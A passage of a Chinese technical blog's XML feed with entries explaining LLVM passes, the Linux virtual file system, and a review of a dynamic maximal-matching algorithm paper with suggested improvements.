你得对技术怀敬畏之心。因为那些谁都懂的技术，在某些人的手里，还真能变出花儿来。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/a7561c66/">http://home.meng.uno/articles/a7561c66/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      前言
关于web性能，有两个著名论断：

 1. 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller
 2. 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders

前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精…

后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="前端" scheme="http://home.meng.uno/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="html5" scheme="http://home.meng.uno/tags/html5/"/>
    
      <category term="性能" scheme="http://home.meng.uno/tags/%E6%80%A7%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>LLVM与Pass</title>
    <link href="http://home.meng.uno/articles/c0258bc3/"/>
    <id>http://home.meng.uno/articles/c0258bc3/</id>
    <published>2016-08-11T06:48:40.000Z</published>
    <updated>2020-12-02T01:54:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1>LLVM简介</h1><p>传统的编译器，采用的是针对单语言源代码，生成对应平台机器码的方式，类似于：</p><p><img src="http://www.meng.uno/images/llvm/SimpleCompiler.png" alt=""></p><p>而LLVM则采用了一种多前端，多后端的方式，如下：</p><p><img src="http://www.meng.uno/images/llvm/RetargetableCompiler.png" alt="Retargetable"></p><p>在LLVM当中，LLVM IR是一种low-level的，虚拟指令集。所有的前端语言都能够生成LLVM，从而能够被统一的进行处理。在LLVM当中，还提供了对LLVM IR Optimization进行优化的方式，能够对现有的源码进行搜索，匹配对应的pattern，从而进行指令的替换、修改。<br> LLVM中，每个过程都是从Pass继承来的，LLVM优化器提供了许多passes，每个都写的很简洁，它们被编译成了库文件，并且在编译的时候被调用。这些库提供了分析和变换的能力，并且既能独立运作，又能合作。</p><h1>代码生成</h1><p>那么LLVM这种“多对多”的编译方式，是如何将LLVM IR转化为机器码的呢？LLVM将代码的生成划分成了多个独立的过程：指令选择、寄存器生成，调度，代码布局优化，生成汇编代码。这样不同的平台，也能够利用自己的优势，对相同的LLVM IR进行优化。 LLVM采用了一种“mix and match”的方式，允许target作者，对于架构做出明确的指示，例如对寄存器的使用、限制做出明确的指示。LLVM利用Target-8description文件来指定对应架构的特性、使用的指令、寄存器。</p><p><img src="http://www.meng.uno/images/llvm/X86Target.png" alt="X86Target"></p><p>而LLVM利用<strong>tblgen</strong>工具从这些.md文件当中，能够读取出足够的信息，并且在instruction selection、register allocator等过程中，选择处理的过程。而.cpp文件，则是实现一些特定的过程，例如浮点指针栈。</p><h1>LLVM pass</h1><p>LLVM pass完成编译器的变换、优化工作；它们是Pass的子类，根据不同的需要，可以选择去继承ModulePass，CallGraphSCCPass，FunctionPass，或者LoopPass，RegionPass和BasicBlockPass等。</p><p>llvm是需要编写、编译、加载和执行的，它相当于一个可以加载的模块。<br> 如果想编写一个模块，可以再llvm/lib/Transform当中创建对应的目录，并且在Transform以及目标文件夹下同时修改两个CMakeLists。在编译时，llvm的编译链会自动生成对应的pass。</p><p>pass是基于中间语言llvm IR来进行的。因此它用来对.bc文件进行优化，例如：</p><pre><code>opt -load /lib/LLVMLbpass.so -lbpass &lt;foo.bc&gt; /dev/null</code></pre><p><br><br>本文链接： <a href="http://home.meng.uno/articles/c0258bc3/">http://home.meng.uno/articles/c0258bc3/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      LLVM简介
传统的编译器，采用的是针对单语言源代码，生成对应平台机器码的方式，类似于：



而LLVM则采用了一种多前端，多后端的方式，如下：



在LLVM当中，LLVM IR是一种low-level的，虚拟指令集。所有的前端语言都能够生成LLVM，从而能够被统一的进行处理。在LLVM当中，还提供了对LLVM IR Optimization进行优化的方式，能够对现有的源码进行搜索，匹配对应的pattern，从而进行指令的替换、修改。
LLVM中，每个过程都是从Pass继承来的，LLVM优化器提供了许多passes，每个都写的很简洁，它们被编译成了库文件，并且在编译的时候被调用。这些库提
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="LLVM" scheme="http://home.meng.uno/tags/LLVM/"/>
    
      <category term="编译安全" scheme="http://home.meng.uno/tags/%E7%BC%96%E8%AF%91%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Linux文件系统</title>
    <link href="http://home.meng.uno/articles/a4b4101b/"/>
    <id>http://home.meng.uno/articles/a4b4101b/</id>
    <published>2016-08-01T08:54:49.000Z</published>
    <updated>2020-12-02T01:54:18.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>虚拟文件系统(VFS)是linux的内核软件层，它能够为各种文件系统提供通用的接口，例如linux，unix，windows系统。它是一个位于应用程序和具体文件之间的中间层。VFS引入了一个通用文件模型，它能够表示所有支持的文件系统，它包含有超级块对象、索引节点对象、文件对象、目录项对象。</p></blockquote><h1>超级块对象</h1><p>super_block存放已安装文件系统的有关信息，对基于磁盘的文件系统，它通常对应于存放在磁盘上的文件系统控制块。对于一个特定的文件系统，超级块的格式是固定的。每一个文件系统都对应一个超级块，它们都会链接到一个超级块链表，而文件系统中的每个文件在打开时都需要在内存分配一个inode结构它们都要链接到超级块。</p><h1>索引节点对象</h1><p>文件系统处理文件所需要的所有信息，都放在索引节点的数据结构中。对于每个文件来说，索引节点对文件是唯一的,其数据结构是inode。要访问一个文件时，一定要通过它的索引才知道它是什么类型的文件(inode有一个union包含了这个信息)。inode包含了文件的各种信息。它还包含一个dentry结构的队列，可以通过它找到与这个文件相联系的所有dentry结构，指向超级块的指针等。每个索引节点对象也包含在文件系统的双向循环链表中，这个链表的头保存在超级块对象中。同时，inodes也存放在一个散列表中，用来加快对索引对象的搜索。</p><h1>文件对象</h1><p>文件对象用来描述一个进程怎样与一个打开的文件进行交互，它是在文件被打开的时候创建的，由一个file数据结构来描述。其存放的主要信息是文件指针，即文件中当前的位置。使用中的文件对象，包含在超级块所确立的链表中。其中的f_list字段包含了前一个/后一个对象的指针。</p><h1>目录项对象</h1><p>VFS把每个目录看作由若干子目录和文件组成的一个普通文件。在目录项被读入内存后，VFS就用一个dentry结构来表示它。对于进程查找路径中的每一个分量，都为其创建一个目录项分量。每个分量都和其对应的索引节点相联系。由于目录项对象可能会经常使用，因此linux使用目录项高速缓存，它包含一个不同状态的目录项对象集合，以及一个用于快速的散列表。</p><h1>文件操作函数的调用</h1><p>由于每个文件系统都有其自身的文件操作集合，VFS将inode从磁盘装入内存时，会把文件操作的指针存放在数据结构file_operation中(定义在fs.h中)，而该结构的地址存放在索引节点对象的i_fop字段中。进程打开文件时，VFS就用存放在索引节点中的地址初始化新文件对象的f_op字段，使得后续操作能够继续调用这些文件操作函数。f_op是指向文件操作表的指针。事实上除了file_operations,还有dentry_operations和inode_operations，super_operations，但它们通常只在打开文件的过程中使用，不像file_operations结构中那些函数常用。</p><h1>进程与文件</h1><p>已打开的文件，是属于进程的一项“财产”，归具体的进程所有。在进程的task_struct中，包含两个数据结构.</p><pre><code>struct fs_struct *fs;struct files_struct *files;</code></pre><p>其中，fs_struct是关于文件系统的信息，它反映的主要是带有全局性的，对具体进程而言的信息，与具体打开的文件关系不大。fs_struct里面包含有一个指针pwd，它总是指向进程的“当前工作目录”，每当进程进入不同目录时，内核就使进程的pwd指向这个目录在内存中的dentry，而root指针则指向进程的根目录(还有一个altroot，指向“替换跟目录”)。files_struct是关于已打开文件的信息，它的主体是一个file结构数组，每打开一个文件后，进程就通过一个fid来访问这个文件，这个fid实际上就是它在file数组中的下标。</p><h1>文件系统的安装和拆卸</h1><p>每当将一个存储设备安装到现有文件系统中的某个节点时，内核都要为之建立一个vfsmount结构，它既包含了该设备的信息，又包含了有关安装点的信息。因此fs_struct中的pwdmnt总是指向一个vfsmount结构。 与传统的Unix内核不同，linuc允许同一个文件系统被安装许多次。对于每个安装操作，内核通过一个vfsmount数据结构来保存安装点和安装标志等信息。这个vfsmount数据结构保存在几个双向循环链表中：父文件系统vfsmount描述符的地址和安装点dentry的地址索引散列表；属于每一命名空间的已安装文件系统描述符形成的双向循环链表；每一个已安装文件系统已安装的文件形成等双向循环链表。</p><h2 id="安装普通文件系统">安装普通文件系统</h2><p>mount系统调用用来安装一个普通文件系统。它的服务例程sys_mount()向下调用了do_mount，并最后由do_kern_mount()函数完成了安装操作的核心。do_kern_mount首先会查找对应的文件系统类型，然后分配一个新的已安装文件系统的描述符mnt，并初始化一个新的超级块(如果get_sb能够在链表中找到对应的超级块对象，说明这个设备被安装了多次，直接返回这个已有超级块的地址)，以及mnt中的一些字段。最后，它会把这个描述符插入到合适的链表中去。在完成这些工作后，该函数将mnt返回。</p><h2 id="安装根文件系统">安装根文件系统</h2><p>根文件系统的安装与普通文件系统安装是不同的，它是系统初始化的关键部分。它分为两个部分，首先是安装特殊rootfs文件系统，它提供一个作为初始安装点的空目录；随后内核在空目录上安装实际根文件系统。为什么要先安装rootfs？因为它允许内核轻易地改变实际根文件系统，而内核会逐个安装卸载许多个根文件系统。<br> 在rootfs安装阶段，do_kern_mount会调用rootfs_get_sb，为其分配特殊的超级块。随后为进程0分配namespace，将其根目录和当前工作目录设置为根文件系统。  <br> 在实际安装阶段，内核调用mount_root函数，在rootfs初始根文件系统中创建设备文件/dev/root。调用sys_chdr(“root”)改变进程的当前目录，然后移动rootfs上的安装文件系统和安装点。而rootfs也并没有被卸载，只是隐藏在根目录下而已。</p><h2 id="卸载文件系统">卸载文件系统</h2><p>unmount系统调用由来卸载一个文件系统。相应的sys_unmount例程对文件名和一组标志进行处理。首先需要对安装点路径名进行查找，随后调用do_unount，根据标志位进行相应的处理。unmount_tree会卸载文件系统(及其所有子文件系统)。最后，内核会减少相应文件系统根目录的目录项对象和已安装文件系统描述符的引用计数器值。</p><h1>路径名查找</h1><p>进程识别一个文件时，需要分析路径名，并且把它拆分成一个文件名序列。首先需要区分这个路径是相对路径还是绝对路径。这个可以通过路径名的第一个字符是否是“/”来确定。绝对路径从进程的根目录开始搜索，否则从进程的当前目录开始搜索。<br> 在这个过程中，内核会检查依次检查序列中的每一项，找到与它匹配的目录项，以获得相应的索引节点；再读取这个索引节点的目录文件，继续检查下去。但这个过程没有想象的那么简单：每个目录的访问权都需要检查，文件名可能是与任意一个路径名对应的符号链接，符号链接会包括循环，查找可能会延伸到其他的文件系统。  <br> 路径名查找接受一个文件名指针，一个标志，以及一个nameidata数据结构的地址，这个nameidata存放了查找操作的结果。nameidata中的dentry和mnt分别指向所解析的最后一个路径分量的目录项对象和已安装文件系统对象。</p><h1>文件打开/读写</h1><p>文件打开和关闭，核心是对一个fd进行操作。这个fd也就是指向文件对象的指针数组task_struct-&gt;files-&gt;fd中分配给新文件的索引。创建一个新的文件对象，然后将它放在fd数组中。 文件读写是对于文件自身来说的，因此其相关的信息存储在inode中。linux中，对于文件的读写，实际上是对缓冲区直接进行的，而不是直接在文件上操作。对文件的操作由内核中的线程kflushd来完成，它们相当于一道流水线上的两道工序。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/a4b4101b/">http://home.meng.uno/articles/a4b4101b/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      虚拟文件系统(VFS)是linux的内核软件层，它能够为各种文件系统提供通用的接口，例如linux，unix，windows系统。它是一个位于应用程序和具体文件之间的中间层。VFS引入了一个通用文件模型，它能够表示所有支持的文件系统，它包含有超级块对象、索引节点对象、文件对象、目录项对象。

超级块对象
super_block存放已安装文件系统的有关信息，对基于磁盘的文件系统，它通常对应于存放在磁盘上的文件系统控制块。对于一个特定的文件系统，超级块的格式是固定的。每一个文件系统都对应一个超级块，它们都会链接到一个超级块链表，而文件系统中的每个文件在打开时都需要在内存分配一个inode结构它们都
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="文件系统" scheme="http://home.meng.uno/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>完全动态最大匹配的简单确定性算法</title>
    <link href="http://home.meng.uno/articles/8e9f2014/"/>
    <id>http://home.meng.uno/articles/8e9f2014/</id>
    <published>2016-07-16T12:40:27.000Z</published>
    <updated>2020-12-02T01:41:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>Simple Deterministic Algorithms for Fully Dynamic Maximal Matching</p></blockquote><h1>解决的问题</h1><p>这篇文章介绍了什么是“完全动态最大匹配”，然后介绍了他们提供的在最坏情况下更新时间为平摊O(√m)（m表示图中的边数）时间复杂度、O(n+m)空间复杂度内完成的“3/2-近似最大基数匹配（MCM）”算法。这篇文章是为了处理图论中的“匹配”问题，作者将“图”分成[1]一般图，[2]低荫度[4]图 两种来处理。而对于每种图，处理步骤与方法基本一致，每种图都有——“插入”、“删除”两种操作，所不同的就是每种图所对应的情况（Case）不同而已。</p><h1>采用的思想</h1><p>这篇算法总体采用了分治的思想在每个小的情况下又有贪心算法的影子，本来“3/2-近似最大基数匹配（MCM）”这个问题相当难解决，而且已知算法中，要么时间复杂度为O(n)，要么为O((n+m)√2/2)而且相当复杂，情况相当多。这篇算法一个很大的优点就是，思路清晰，作者将自己设计算法的思路，无遗地展现在读者面前。说起思路清晰，也就是分的情况条例清晰，也就是我们所说的分治思想。本来一个大问题不好求解，但我们可以通过将其分解为等价的几个小问题分别求解。</p><p>就像这篇算法，将“完全动态最大匹配”分为一般图与低荫度图两个部分来分别阐述，让算法在一般情况以及特殊情况都能游刃有余。</p><p>在应对每一大类图的各种操作（插入或删除）时，由于仍旧很复杂，所以作者又一次运用分治思想，将他们每个具体的操作继续分解为更小的几种情况，同时做到面面俱到，条理清晰。</p><p>在每一个小的情况下，遍历所有情况，找出能使匹配最大的情况，属于贪心的范畴，对于贪心算法，由于每种情况实在所要找的节点较少，所以我也认为贪心是比较不错的选择，而且，我们没必要在这样的小点上过于纠结。</p><h1>基本算法描述</h1><h2 id="一般图">一般图</h2><h3 id="定义v-1-2-n-表示图的顶点的集合">定义V={1,2……n}表示图的顶点的集合</h3><p>为了简单处理，假定√n为整数；</p><p>定义G = (G0,G1……)表示图的集合，而且定义G0为空图，Gi由Gi-1得到；</p><p>对于每一个时间跨度i,Gi=(V,Ei),mi=|Ei| （m表示图中的边数）。</p><h3 id="数据结构">数据结构</h3><p>M 存储在AVL树中（支持O(logn)时间复杂度的插入、删除）每个节点v处保存mate(v)返回当前匹配中的邻接顶点；</p><p>N(v) 存储在AVL树中（v∈V）用于存储节点v的邻接顶点，变量deg(v)存储v的度（无向图）（支持O(logn)时间复杂度的插入、删除以及取出r邻接顶点在O®时间复杂度内）；</p><p>F(v)（v∈V）用于保存v的自由邻接节点（支持O(1)时间复杂度下的插入、删除以及如果有自由邻接顶点就返回TRUE的has-free(v)操作，O(√n)时间复杂度下的返回任意自由邻接顶点的get-free(v)操作），为了很好的得出F(v)，还另外加了一个长度为n的Boolean型数组来表明当前自由邻接顶点、一个长度为√n的范围在[√n<em>j+1,√n</em>(j+1)]的计数数组来保存位置j处的自由邻接顶点的数目、一个变量来存储总的自由邻接节点数。</p><p>一个最大堆Fmax存储所有的以自身的度为权的自由节点（支持O(logn)时间内的插入、删除、update-key、find-max操作）。</p><h3 id="具体算法">具体算法</h3><p>初始化图后，定义三个不变量，每次程序循环运行结束都不会突破这些不变量：</p><ul>  <li>    <p>不变量1：所有节点度不超过√(2m+2n)；</p>  </li>  <li>    <p>不变量2：在第i次循环变为自由节点的节点度不超过√(2m)；</p>  </li>  <li>    <p>不变量3：M是最大匹配，而且没有长度为3的增光路径。</p>  </li></ul><p>然后进行循环，每次循环对边ei进行操作。</p><h4 id="插入边ei-u-v-的操作">插入边ei={u,v}的操作</h4><p>首先更新相关的数据结构：N(u),N(v),deg(u),deg(v),Fmax以及u、v的值。</p><p>然后分如下四种情况讨论：</p><ul>  <li>u、v都已匹配，此时无需操作；</li>  <li>u、v都是自由节点，这种情况下涉及更新M与Fmax，将u、v从F(x)中移除，花费O(√n+m)时间；</li>  <li>u是自由的而v已被匹配，这种境况下，找到最大匹配集M中与v匹配的节点x=mate(v),再找到与x邻接的自由顶点w，如果能找到，则将匹配(x,v)移除，而将（u,v)、(x,w)加入。操作时间也在O(√n+m)内；</li>  <li>v是自由的而v已被匹配，这种情况与上一种相对称。</li></ul><h4 id="删除边ei-u-v-的操作">删除边ei={u,v}的操作</h4><p>删除操作主要分为两种情况：</p><ul>  <li>ei ∉ M 唯一要做的事就是，将u从F(v)，v从F(u)中删去；</li>  <li>ei∈M 由分为两种情况讨论：    <ul>      <li>deg(u)≤√(2m) 时，我们必须通过aug-path(u)来所搜一条以u为起点的长度为3的增广路径，如果没有找到，那么直接标定v为自由节点即可，如果找到，定义u的自由邻接节点为w，w的邻接顶点为y，y的自由临界顶点为x，将{u,w}和{y,x}添加到匹配中而将{w,y}删除，同样的方法处理v。</li>      <li>deg(u)&gt;√(2m) 时，此时u不能自由，因为它的度太高。保持u匹配，我们通过surrogate(u)来获取u的代替节点，我们称呼为su，改变它的状态为自由，然后像在a)中处理u一样处理su。</li>    </ul>  </li></ul><h2 id="对于低荫度图">对于低荫度图</h2><p>在这部分中，考虑的是荫度不大于c的图，而c由下式确定：</p><p><img src="http://www.meng.uno/images/match/1.png" alt="Match"></p><p>其中E(U)表示U中的边数。</p><p>由于图较稀疏，所以将每条边都带上方向，构成△-方向无向图</p><h3 id="数据结构-v2">数据结构</h3><p>与一般图基本相同。</p><h3 id="具体算法-v2">具体算法</h3><p>主要从：定向、插入、删除，几个部分来阐述：</p><h4 id="定向">定向</h4><p>在每一步中，都通过运行算法A，来保证当前图是△-方向的。像如下算法中那样更新F和D，如果有t条边在定向，我们需要O(t)时间。</p><h4 id="插入边ei-u-v-的操作-v2">插入边ei={u,v}的操作</h4><p>由于出度最多为△，所以插入时间O(△)。</p><h4 id="删除边ei-u-v-的操作-v2">删除边ei={u,v}的操作</h4><p>未匹配的边被删除没什么可以操作的，但是当匹配的边被删除就有趣了，这里必须找到u(v)的匹配节点，时间复杂度仍为O(△)。</p><h1>算法分析的结论</h1><p>分析这个算法，其时间复杂度确实是平摊条件[4]下O(√m)(m表示图的边数)；</p><p>其空间复杂度为O(m+n)。</p><p>这个算法确实能在最短的时间内的出“3/2-近似最大基数匹配（MCM）”。</p><h1>用一个例子说明相关算法</h1><p>为了较好的说明这个算法，我仅就自己画的一个图做些简要的分析，有遗漏之处实属算法没理解透：</p><p>（图如下，分别由6个顶点、7条边组成，由于算法本身要求图中点、边数目较多，而简短的语言无法描述清楚，所以选择这样一个简单的图来叙述）</p><p><img src="http://www.meng.uno/images/match/2.png" alt="Match"></p><p>以下模拟算法过程：（只举例说明）</p><p>由文章知，该算法要处理动态图的最大匹配问题，首先初始化G0为空，我们按e0—e6的顺序向图中添加边，然后删除边。</p><ul>  <li>将e0（AB）加入，直接将此边加入最大匹配M；</li>  <li>将e1（AC）加入，不操作；</li>  <li>将e2（BC）加入，不操作；</li>  <li>将e3（CE）加入，直接将此边加入M；</li>  <li>将e4（BF）加入，不操作；</li>  <li>将e5（EF）加入，不操作；</li>  <li>将e6加入，将此边加入M，同时将e3从M中删除，将e4加入，将e0删除，将e1加入M。</li></ul><p>得到如下的最大匹配：</p><p><img src="http://www.meng.uno/images/match/3.png" alt="Match"></p><p>删除边时：</p><p>（由于删边不容易看出来，所以仅将出现可见变化时的情况列出。）</p><ul>  <li>删除e0，不操作；</li>  <li>删除e1,将e1从最大匹配M中删除；</li>  <li>删除e4，将e2加入M，将e4删除。</li></ul><p>得到的匹配如下：</p><p><img src="http://www.meng.uno/images/match/4.png" alt="Match"></p><p>通过以上两个实例（一个删除、一个插入），基本能模拟本文关于动态最大匹配的一般算法。</p><h1>认识与看法</h1><h2 id="已有算法的问题所在">已有算法的问题所在</h2><ol>  <li>    <p>算法提到对于低荫度图，给每条边改成有向边处理，然后用贪心算法求解，但是算法并未给出如何判断一个图是否是低荫度图，而且即使有了一个标准，那么当一个图先是低荫度图，后来因为添加一条边之后，成了算法判断的非低荫度图，之后再添加边……如此一来，后面添加边的匹配操作，仍然会按低荫度图处理，这样一来时间复杂度就明显升高了。与此相反，当一个图先是普通图，当减去一条边后，成了低荫度图，再继续减去边……后来虽然形成了低荫度图，但是仍然按普通图来处理的。——我的意思是，当加边/减边（一个更新操作）在普通图与低荫度图之间轮换时，算法会因每次都错开最好情况而用的时间急剧升高。在实际应用中，这种情况应该会很常见，所以我认为这个问题还是相当严峻的。</p>  </li>  <li>    <p>算法一直在说向图G，但这是一个“抽象”的概念，文中并没有提及这个图是怎么存储的，也没有提及添加/删除边是怎么进行的。我觉得这虽然是不起眼的一部分，但是它实现的好坏，却是后来算法的高效进行与否的保证。（在第四次作业中我将详细分析不同存储结构存储的图的不同之处，以及哪种存储对此算法的实现最有益。）</p>  </li></ol><h2 id="已有算法可改进之处">已有算法可改进之处</h2><ol>  <li>算法中提到对点的度按降序排列，但如果两个点的度完全一样，或者所有点的度完全一样时，这样的处理难免有些草率，和普通匹配算法没有这一处理操作的算法过程相似，甚至多了偶尔的不必要交换（当度相同时的交换），于是我想到，能不能通过增加一个标志位来改进交换同时由于考虑到一般情况下，顶点的度有大部分是相同的，所以可以考虑改进一下排序操作，找一个比较稳定的排序是比较好的。</li>  <li>算法用AVL树来存储匹配，这一点感觉是比较好的操作，但是当存储每个点的邻接点时，不仅又用AVL树来存储，而且需要用另外一个变量存储该顶点的度，而且每次插入/删除边（一个更新操作）都可能需要调整AVL树，于是，我想能不能用更好的适用于随机搜索（插入、删除）的数据结构，例如：散列表来存储邻接顶点呢？这样一来，搜索的时间由O(logN)减小到O(1)，空间基本不会增加，反而减少一个整型空间（每个顶点减少一个，共N个），插入/删除边的时间大约也是O(1)，这样一来就比以前的算法要改进了一些（具体实现，见作业四）。</li>  <li>算法中提到用一个数据结构F(v)来存储顶点v的邻接顶点中未匹配的顶点，及其信息。然后算法提到一个长度为n（n表示所有顶点数量）的数组以及一个长度√n的计数数组。这种处理，在原则上是没有什么错误的，但是长度为n或者√n的数组没法实现每次插入顶点时就没法用了，为了实现完全动态匹配，我们需要用一个更好的数据结构来完成这一操作（当然对于本算法，这一改进并没有什么作用，但是想到可以为算法进行拓展，所以这个改进是必要的），我想到的数据结构是动态表——一种最省空间，且扩充/缩减时间O(1)（由摊还分析可证）的数据结构。</li>  <li>当数据量较大，短时间有较多条边需要插入/删除时，（通过插入操作来说明）每次操作，都是先将边加入存储边的数据结构，然后再依次更新其他相邻节点的邻接信息，以及边的信息。最后再分情况（动态规划）依次判断以及做出调整，简单来讲，整个判断过程分为三个部分，而且这三个部分是相互独立的，所以假如有N次插入，那么就有3N步，正常情况（该算法原来描述那样）。在一次插入边的操作结束后，存储边的数据结构便空闲下来，而第二次边的插入还没有开始。中间这部分时间浪费严重（当大数据来临时）。</li></ol><h2 id="已有算法不适用之处">已有算法不适用之处</h2><ol>  <li>算法一开始是通过一个空的数据结构开始插入边，来建立匹配，假如已有一个大数据的图（数据在外存，一般来说数据量过大，没法一次性装入内存）或者，由于数据量过大，没法普通存储（或者为了省空间、减小出错率）而用压缩图来存储，如果仍然用现有的算法来做，是极其困难的。也许可以实现，但是也困难重重，我仅将其归为不适用的一类。</li></ol><h1>改进意见</h1><ul>  <li>针对第一处问题。为了在每一步都使算法做到最优，那么在低荫度图与普通图的转换接口处，就应该更加重视，为了解决这个问题，我觉得，可以在每增加/删除一条边（一个更新操作）时增加一次判断，即：max[|E(U)|/(|U|-1)]&gt;C时，就进行普通图的操作，否则进行低荫度图的操作，其中C为预设的荫度的分界线。同时，首先对普通图的操作，或者对低荫度图的操作，当第一次出现两种图混合时，再初始化另一种图的存储结构，这样一来如果一直是基于两者中一种图的更新操作，就不需要那么大的空间开销。</li></ul><p>在原算法，没有这一判断时，相对现在的改进，在每一次更新操作的时间上先是少一步，但当更新操作在多次往往复复地在两种图之间转换时，虽然改进多了一次判断，但是避免了两种图用同一种算法实现的时间消耗，算法改进的正确性及合理性得证。</p><ul>  <li>针对第二处问题。我觉得这里的问题是作者的一个疏忽，当然在这个算法中，选用哪种数据结构来存储图，确实不是那么好选择的。选用邻接矩阵时，虽然边的信息清晰明了，但是，当数据量增大时，空间开销也是挺大的。若选用邻接表，减少了空间开销，但是，当每次统计某个节点的邻接顶点时，显得有些麻烦，邻接多重表，十字链表等弊端就更多与优点了。于是，在此改进中，我仅仅提出“邻接矩阵”与“邻接表”这两种存储图的数据结构来存储这个算法有关的图，这样，相对来说，比其他数据结构要简单，以及开销较小（时间/空间上）。</li></ul><p>这两种图的存储结构，都可以实现边的插入/删除在O(1)时间内，并且相对其他存储结构还比较好实现，于是正确性得证。</p><ul>  <li>针对第一处不足。我觉得可以增加一个标志位（整型）来实现对同一个度的不同节点做一下区分，第一次度为某个值的顶点标记为1，以后如果再有和这个点度相同的标记为2，……以此类推，每次为了保证度越高的节点越先匹配，不仅要判断度的大小，同时当度相等时，还要判断标志位，标志位越小（越大也行）就越优先保持匹配。</li></ul><p>这一改进，使该算法对多顶点度相等的图，效果明显，当然当顶点度基本都不相同时，这一改进显得一无是处，反而增加空间开销。但就对程序改进角度讲，这样做着实可以在某些情况下，增加算法正确性，减少算法时间复杂性，我觉得这可以作为改进合理性的证明。</p><ul>  <li>针对第二处不足。我觉得可以用散列表来存储每个顶点的邻接点信息，这样一来，可以减少一个整型变量空间，同时使搜索某个点是否与另一个点邻接能够在O(1)时间内完成（这也是散列表的最大的用处）。当然，散列表的构造也有很多方式，这里可以假设之前每个顶点都有一个ID或者有一个单独的可区分的标识。当以顺序ID来标记每个顶点时，可以用直接寻址法；当以单独的可区分标识来标记每个顶点时，可以用数据分析法来确定散列函数。</li></ul><p>该改进的正确性，可以通过散列表在搜索上的正确性来证明，同时在空间复杂性上可能比以前算法要多（当然也可能相同），但在搜索时间上，对原有算法改进是十分显著的。由此，改进的合理性由此得证。</p><ul>  <li>针对第三处不足。这一点属于“个人爱好”，为什么这么说呢？因为这一改进对原有算法不会产生一丁点的影响，但是却为程序可拓展性做了一点贡献。用动态表代替原有长度固定的数组，当顶点个数增多时，可以避免每次不够用又重新手动申请空间的弊端。可以说，动态表这一数据结构完美适应了顶点可变的情况，当边减少时，那些独立的顶点，可以通过某种方式，将其删去，以减少空间复杂性，同时，顶点减少，搜索更快；当边增多时，如果某些顶点原来没有记录，再在动态表中将其加入，丝毫不用担心空间分配麻烦问题。</li></ul><p>动态表实现简单，效率高，事实上它和普通数组相比基本没有效率损失。我觉得即使是原算法思想（即使没边，也有顶点）也可以用动态表代替数组。</p><ul>  <li>针对第四处不足。当大数据来临时，我将每次的匹配过程看成三部分，这让我想起了《计算机组成原理》中关于指令流水线的介绍，我发现该算法中三部分之间互相无关联，于是，我就想能不能仿照指令流水线的方式，来改进已有算法的三段匹配过程呢？也就是说，当第一条边插入时，我顺序开始执行那三段操作，当执行完第二段时，第二次插入已经可以开始执行了……依次类推，当大量数据进行同一个操作（插入/删除边）时，就可以成倍地减少时间复杂性（将三段融合成一段）。</li></ul><p>这一改进符合并行性要求，而且可以证明，原来程序的三段互不影响，那么这个改进就显得在大数据上大有用武之处。</p><ul>  <li>针对第一处不适。由于该算法是每次（动态）加入边，而现实是需要先初始化一个图，而且还可能是大量的数据的图，所以该算法不适用之处就显现出来了。虽然如果将已经存在的大数据图里的边一个个挑出来再加入，可以完成此操作，但是考虑时间将会是特别大的。于是想到，能不能给该算法在加一点能够对静态图匹配的内容，以便其能够在大数据上发挥作用。</li></ul><p>如今，数据已进入海量时代，应对大数据冲击，已经成为考验所有算法好坏的一个标准，于是对此算法往大数据上适应，是十分有必要的。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/8e9f2014/">http://home.meng.uno/articles/8e9f2014/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      Simple Deterministic Algorithms for Fully Dynamic Maximal Matching

解决的问题
这篇文章介绍了什么是“完全动态最大匹配”，然后介绍了他们提供的在最坏情况下更新时间为平摊O(√m)（m表示图中的边数）时间复杂度、O(n+m)空间复杂度内完成的“3/2-近似最大基数匹配（MCM）”算法。这篇文章是为了处理图论中的“匹配”问题，作者将“图”分成[1]一般图，[2]低荫度[4]图 两种来处理。而对于每种图，处理步骤与方法基本一致，每种图都有——“插入”、“删除”两种操作，所不同的就是每种图所对应的情况（Case）不同而已。

采用的思
    
    </summary>
    
      <category term="Algorithm" scheme="http://home.meng.uno/categories/Algorithm/"/>
    
    
      <category term="算法设计" scheme="http://home.meng.uno/tags/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="最大匹配" scheme="http://home.meng.uno/tags/%E6%9C%80%E5%A4%A7%E5%8C%B9%E9%85%8D/"/>
    
      <category term="确定性算法" scheme="http://home.meng.uno/tags/%E7%A1%AE%E5%AE%9A%E6%80%A7%E7%AE%97%E6%B3%95/"/>
    
      <category term="动态" scheme="http://home.meng.uno/tags/%E5%8A%A8%E6%80%81/"/>
    
  </entry>
  
  <entry>
    <title>汇编指令大全</title>
    <link href="http://home.meng.uno/articles/711069a/"/>
    <id>http://home.meng.uno/articles/711069a/</id>
    <published>2016-07-16T12:18:01.000Z</published>
